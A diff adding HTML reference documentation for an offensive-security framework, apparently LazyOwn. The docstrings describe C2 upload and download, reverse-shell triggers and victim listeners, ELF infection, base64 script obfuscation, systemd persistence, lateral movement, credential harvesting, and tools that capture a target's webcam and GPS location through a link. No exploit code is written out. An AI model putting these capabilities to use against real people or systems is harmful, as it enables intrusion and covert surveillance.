+<p>This will execute the enumeration module with the <code>-run</code>
+action.</p>
+<p>If no specific command is provided, the function will prompt the user
+to select a module and action interactively.</p>
+<h2 id="create_session_json">create_session_json</h2>
+<p>Generates or updates a JSON file to be used as a database.</p>
+<p>The JSON file will be named
+<code>sessionLazyOwn_{timestamp}.json</code> and will be stored in the
+<code>sessions</code> directory. The JSON file will contain data from
+<code>self.params</code> and additional data extracted from
+<code>credentials*.txt</code> and <code>hash*.txt</code> files.</p>
+<p>The structure of the JSON file will be as follows: -
+<code>params</code>: Data from <code>self.params</code>. -
+<code>credentials</code>: A list of dictionaries containing usernames
+and passwords extracted from <code>credentials*.txt</code> files. -
+<code>hashes</code>: A list of dictionaries containing the contents of
+<code>hash*.txt</code> files. - <code>notes</code>: The content of the
+<code>notes.txt</code> file, if it exists.</p>
+<p>Returns: None</p>
+<h2 id="shellcode2elf">shellcode2elf</h2>
+<p>Convert shellcode into an ELF file and infect it.</p>
+<p>This function takes an optional input line that specifies the name of
+the shellcode file. If no input line is provided, a filename is
+generated based on the domain. The function reads the shellcode and
+inserts it into a C source file, then compiles the source file into an
+ELF file. It also creates an infected version of the ELF file and
+uploads all generated files to a command and control (C2) server.</p>
+<p>Args: line (str): An optional input line that specifies the name of
+the shellcode file.</p>
+<p>Returns: None</p>
+<h2 id="ssh_cmd">ssh_cmd</h2>
+<p>Perform Remote Execution Command trow ssh using grisun0 user, see
+help grisun0</p>
+<p>Parameters: line (str): The command line input, is the command to
+execute, if not presented is whoami</p>
+<p>Returns: None</p>
+<h2 id="clone_site">clone_site</h2>
+<p>Clone a website and serve the files in sessions/{url_cloned}. Args:
+line (str): input line that url to clone</p>
+<p>Returns: None</p>
+<h2 id="knokknok">knokknok</h2>
+<p>Send special string to trigger a reverse shell, with the command ‘c2
+client_name’ create a listener shell script to drop the reverse shell in
+python3 Args: line (str): input line not used</p>
+<p>Returns: None</p>
+<h2 id="listener_go">listener_go</h2>
+<p>Configures and starts a listener for a specified victim.</p>
+<p>This function takes a command line input to configure and start a
+listener for a specified victim. The input should include the victim ID,
+the choice of listener type, and optionally the port numbers. The
+function then constructs the appropriate command to start the listener
+and assigns the necessary parameters.</p>
+<p>Args: line (str): The command line input containing the victim ID,
+listener type, and optional port numbers.</p>
+<p>Returns: None</p>
+<p>Raises: None</p>
+<p>Example: &gt;&gt;&gt; listener_go victim1 2 1337 7777</p>
+<h2 id="listener_py">listener_py</h2>
+<p>Configures and starts a listener for a specified victim.</p>
+<p>This function takes a command line input to configure and start a
+listener for a specified victim. The input should include the victim ID,
+the choice of listener type, and optionally the port numbers. The
+function then constructs the appropriate command to start the listener
+and assigns the necessary parameters.</p>
+<p>Args: line (str): The command line input containing the victim ID,
+listener type, and optional port numbers.</p>
+<p>Returns: None</p>
+<p>Raises: None</p>
+<p>Example: &gt;&gt;&gt; listener_py victim1 2 1337 7777</p>
+<h2 id="ipinfo">ipinfo</h2>
+<p>Retrieves detailed information about an IP address using the ARIN
+API.</p>
+<p>This function takes an IP address as input, queries the ARIN API to
+get detailed information about the IP, and then displays the
+organization name and the network range associated with the IP.</p>
+<p>Args: line (str): The command line input containing the IP address to
+query.</p>
+<p>Returns: None</p>
+<p>Raises: None</p>
+<p>Example: &gt;&gt;&gt; ipinfo 1.1.1.1</p>
+<h2 id="service_ssh">service_ssh</h2>
+<p>Creates a systemd service file for a specified binary and generates a
+script to enable and start the service.</p>
+<p>This function takes the name of a binary as input, creates a systemd
+service file for it, and generates a shell script to enable and start
+the service. The script is saved in the sessions directory and a command
+is provided to execute the script remotely via SSH.</p>
+<p>Args: line (str): The command line input containing the name of the
+binary. If an absolute path is not provided, a default path is used.</p>
+<p>Returns: None</p>
+<p>Raises: None</p>
+<p>Example: &gt;&gt;&gt; service my_binary_name</p>
+<h2 id="service">service</h2>
+<p>Creates a systemd service file for a specified binary and generates a
+script to enable and start the service.</p>
+<p>This function takes the name of a binary as input, creates a systemd
+service file for it, and generates a shell script to enable and start
+the service. The script is saved in the sessions directory and a command
+is provided to execute the script remotely via SSH.</p>
+<p>Args: line (str): The command line input containing the name of the
+binary. If an absolute path is not provided, a default path is used.</p>
+<p>Returns: None</p>
+<p>Raises: None</p>
+<p>Example: &gt;&gt;&gt; service my_binary_name</p>
+<h2 id="toctoc">toctoc</h2>
+<p>Sends a magic packet to the Chinese malware. The function extracts
+rhost and rport from self.params[“rhost”] and self.params[“rport”],
+respectively.</p>
+<h2 id="upload_c2">upload_c2</h2>
+<p>Upload a file to the command and control (C2) server.</p>
+<p>This function handles the uploading of a file to the C2 server. If no
+file is specified in the input line, it prompts the user to enter the
+file extension (defaulting to ‘txt’) and retrieves the file using the
+<code>get_users_dic</code> function. If a file is specified in the input
+line, it directly uploads that file.</p>
+<p>Args: line (str): The input line containing the file path to upload.
+If empty, the function will prompt the user to enter the file
+extension.</p>
+<p>Returns: None</p>
+<h2 id="download_c2">download_c2</h2>
+<p>Download a file from the command and control (C2) server.</p>
+<p>This function handles the downloading of a file from the C2 server.
+It requires the remote path of the file to be specified in the input
+line. If the input line is empty, it prints an error message and
+returns.</p>
+<p>Args: line (str): The input line containing the remote path of the
+file to download. If empty, the function will print an error
+message.</p>
+<p>Returns: None</p>
+<h2 id="groq">groq</h2>
+<p>Execute a command to interact with the GROQ API using the provided
+API key.</p>
+<p>This function takes an optional input line that is used as the
+prompt. If no input line is provided, the default prompt stored in the
+instance is used. The function sets the GROQ_API_KEY environment
+variable and runs a Python script to interact with the GROQ API.</p>
+<p>Parameters: line (str): The input line to be used as the prompt. If
+not provided, the default prompt is used.</p>
+<p>Returns: None</p>
+<h2 id="c2asm">c2asm</h2>
+<p>Display C and ASM code side by side in a curses-based interface.</p>
+<p>This function sets up a curses window to display C code and its
+corresponding assembly code side by side. It allows the user to select a
+.c file from the ‘sessions’ directory and then displays the code with
+scrolling capabilities both vertically and horizontally. A green
+vertical line separates the C code from the ASM code.</p>
+<p>Parameters: stdscr (curses.window): The curses window object to draw
+on.</p>
+<p>Returns: None</p>
+<h2 id="view_code">view_code</h2>
+<p>Display C and ASM code side by side in a curses-based interface.</p>
+<p>This function sets up a curses window to display C code and its
+corresponding assembly code side by side. It allows the user to select a
+.c file from the ‘sessions’ directory and then displays the code with
+scrolling capabilities both vertically and horizontally. A green
+vertical line separates the C code from the ASM code.</p>
+<p>Parameters: stdscr (curses.window): The curses window object to draw
+on.</p>
+<p>Returns: None</p>
+<h2 id="camphish">camphish</h2>
+<p>Executes the camphish tool for Grab cam shots from target’s phone
+front camera or PC webcam just sending a link.</p>
+<p>This function: - Installs camphish if not already installed. -
+Executes the camphish command with the provided parameters. - Displays
+the result in the terminal.</p>
+<p>Behavior: - Requires <code>git</code> and <code>php</code> to be
+installed. - Uses a one-liner installation method for simplicity.</p>
+<p>Usage: camphish</p>
+<h2 id="hound">hound</h2>
+<p>Executes the hound tool for Hound is a simple and light tool for
+information gathering and capture exact GPS coordinates</p>
+<p>This function: - Installs hound if not already installed. - Executes
+the hound command with the provided parameters. - Displays the result in
+the terminal.</p>
+<p>Behavior: - Requires <code>git</code> and <code>php</code> to be
+installed. - Uses a one-liner installation method for simplicity.</p>
+<p>Usage: hound</p>
+<h2 id="ofuscatesh">ofuscatesh</h2>
+<p>Obfuscates a shell script by encoding it in Base64 and prepares a
+command to decode and execute it.</p>
+<p>This function reads the content of a shell script file, encodes it in
+Base64, and constructs a command that can be used to decode and execute
+the encoded script using <code>echo</code> and
+<code>base64 -d</code>.</p>
+<p>Args: line (str): The path to the shell script file to be obfuscated.
+If not provided, a default path is obtained from the
+<code>get_users_dic</code> function.</p>
+<p>Returns: None</p>
+<p>Example: &gt;&gt;&gt; ofuscatesh /path/to/script.sh or just
+ofuscatesh # This will read the script, encode it in Base64, and prepare
+a command to decode and execute it.</p>
+<h2 id="load_session">load_session</h2>
+<p>Load the session from the sessionLazyOwn.json file and display the
+status of various parameters.</p>
+<p>This command reads the sessionLazyOwn.json file from the sessions
+directory and displays the status of parameters, credentials, hashes,
+notes, plan, id_rsa, implants, and redop.</p>
+<p>:param line: Additional arguments (not used in this command)</p>
+<h2 id="lateral_mov_lin">lateral_mov_lin</h2>
+<p>Perform lateral movement by downloading and installing LazyOwn on a
+remote Linux machine.</p>
+<p>This function automates the process of setting up an APT and PIP
+proxy, downloading the LazyOwn package, transferring it to a remote
+machine, and installing it. The function ensures that all necessary
+directories are created and that the package is correctly installed on
+the remote machine.</p>
+<p>Parameters: line (str): The command line input, which is not used in
+this function.</p>
+<p>Returns: None</p>
 <h2 id="find_tgts">find_tgts</h2>
 <p>Finds and returns a list of target hosts with port 445 open in the
 specified subnet.</p>
@@ -5830,6 +6674,18 @@ characters matching the regular expression.</p>
 <h2 id="install_netexec">install_netexec</h2>
 <p>No description available.</p>
 <h2 id="install_netexec_pipx">install_netexec_pipx</h2>
+<p>No description available.</p>
+<h2 id="load_chameleon">load_chameleon</h2>
+<p>No description available.</p>
+<h2 id="load_betterxencrypt">load_betterxencrypt</h2>
+<p>No description available.</p>
+<h2 id="load_pyfuscation">load_pyfuscation</h2>
+<p>No description available.</p>
+<h2 id="reverse_b64_encoder">reverse_b64_encoder</h2>
+<p>No description available.</p>
+<h2 id="load_psobfuscation">load_psobfuscation</h2>
+<p>No description available.</p>
+<h2 id="install_wmiexecpro">install_wmiexecpro</h2>
 <p>No description available.</p>
 <h2 id="double_base64_encode">double_base64_encode</h2>
 <p>Perform double Base64 encoding on the given command.</p>
